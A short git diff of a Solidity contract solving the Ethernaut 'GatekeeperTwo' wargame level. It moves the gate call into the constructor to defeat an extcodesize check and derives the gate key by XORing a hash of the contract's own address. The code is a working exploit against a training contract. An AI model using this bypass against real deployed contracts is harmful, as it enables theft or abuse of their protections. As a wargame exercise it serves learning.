@@ -9,15 +9,16 @@ contract EntrantTwo  {
 
     constructor(address $your_ethernaut_instance_here) {
         gatekeeperTwo = GatekeeperTwo($your_ethernaut_instance_here);
+        slipInside();
     }
 
-    function goTwo() public {
+    function slipInside() public {
         bytes8 gateKey = bytes8((uint64(0) -1) ^ uint64(bytes8(keccak256(abi.encodePacked(address(this))))));
 
         gatekeeperTwo.enter(gateKey);
     }
 
-    function test() public pure returns (bytes8) {
+    function showYourWork() public pure returns (bytes8) {
 
         // Manual work shown below to help wrap my mind around the solution
 
